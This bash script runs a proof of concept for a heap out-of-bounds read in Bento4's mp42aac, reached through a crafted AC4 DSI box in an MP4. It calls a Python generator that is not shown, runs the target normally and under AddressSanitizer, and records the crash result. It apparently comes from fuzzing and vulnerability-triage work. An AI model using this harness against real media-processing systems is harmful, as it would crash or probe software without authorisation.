#!/usr/bin/env bash
# VULN-001 PoC runner
# Generates the crafted MP4 and feeds it to mp42aac, capturing crash evidence.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TARGET="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
GEN_SCRIPT="${SCRIPT_DIR}/vuln_001_gen.py"
MP4_FILE="${SCRIPT_DIR}/vuln_001.mp4"
OUT_AAC="${SCRIPT_DIR}/vuln_001_out.aac"
STATUS_FILE="${SCRIPT_DIR}/vuln_001_status.txt"

echo "[*] VULN-001 PoC: Heap OOB Read in AP4_BitReader::ReadCache() (dac4/AC4 DSI)"
echo "    Target : ${TARGET}"
echo ""

# ── 1. Verify the binary exists ──────────────────────────────────────────────
if [ ! -x "${TARGET}" ]; then
    echo "[-] Target binary not found or not executable: ${TARGET}"
    exit 1
fi
echo "[+] Target binary verified."

# ── 2. Generate the crafted MP4 ──────────────────────────────────────────────
echo "[*] Generating crafted MP4..."
python3 "${GEN_SCRIPT}"
if [ ! -f "${MP4_FILE}" ]; then
    echo "[-] MP4 generation failed."
    exit 1
fi
echo "[+] MP4 generated: ${MP4_FILE} ($(wc -c < "${MP4_FILE}") bytes)"

# ── 3. Run the target (capture both stdout and stderr) ───────────────────────
echo "[*] Running target against crafted input..."
set +e
"${TARGET}" "${MP4_FILE}" "${OUT_AAC}" > "${SCRIPT_DIR}/run_stdout.txt" 2> "${SCRIPT_DIR}/run_stderr.txt"
EXIT_CODE=$?
set -e

echo "[*] Exit code: ${EXIT_CODE}"
echo "[*] --- stdout ---"
cat "${SCRIPT_DIR}/run_stdout.txt" || true
echo "[*] --- stderr ---"
cat "${SCRIPT_DIR}/run_stderr.txt" || true

# ── 4. Re-run under AddressSanitizer if available ───────────────────────────
ASAN_BIN="/data/ylwang/non-textfuzz/target/Bento4/build_asan/bin/mp42aac"
if [ -x "${ASAN_BIN}" ]; then
    echo ""
    echo "[*] ASan binary found; re-running for detailed report..."
    ASAN_OPTIONS=detect_leaks=0 \
    "${ASAN_BIN}" "${MP4_FILE}" "${OUT_AAC}" \
        > "${SCRIPT_DIR}/asan_stdout.txt" \
        2> "${SCRIPT_DIR}/asan_stderr.txt" || true
    echo "[*] --- ASan stderr ---"
    cat "${SCRIPT_DIR}/asan_stderr.txt" || true
else
    echo "[*] No ASan build found at ${ASAN_BIN}; skipping ASan run."
fi

# ── 5. Interpret and record status ──────────────────────────────────────────
echo ""
if [ "${EXIT_CODE}" -ne 0 ]; then
    SIG=$(( EXIT_CODE - 128 ))
    case "${EXIT_CODE}" in
      139) STATUS="CRASH (SIGSEGV / exit ${EXIT_CODE})" ;;
      134) STATUS="CRASH (SIGABRT / exit ${EXIT_CODE})" ;;
      132) STATUS="CRASH (SIGILL / exit ${EXIT_CODE})" ;;
      *)
        if [ "${SIG}" -gt 0 ]; then
            STATUS="CRASH (signal ${SIG} / exit ${EXIT_CODE})"
        else
            STATUS="NON-ZERO EXIT (${EXIT_CODE})"
        fi
        ;;
    esac
    echo "[!!!] ${STATUS}"
    VERDICT="TRIGGERED"
else
    STATUS="CLEAN EXIT (0)"
    echo "[ ? ] ${STATUS} — the OOB read may have been silent (no ASan build)"
    VERDICT="POSSIBLE (clean exit, ASan needed for confirmation)"
fi

# Write status file
{
    echo "vuln_id    : VULN-001"
    echo "title      : Heap OOB Read via Unbounded AP4_BitReader in AC4 DSI"
    echo "target     : ${TARGET}"
    echo "input      : ${MP4_FILE}"
    echo "exit_code  : ${EXIT_CODE}"
    echo "status     : ${STATUS}"
    echo "verdict    : ${VERDICT}"
    echo "timestamp  : $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
} > "${STATUS_FILE}"

echo "[*] Status written to: ${STATUS_FILE}"
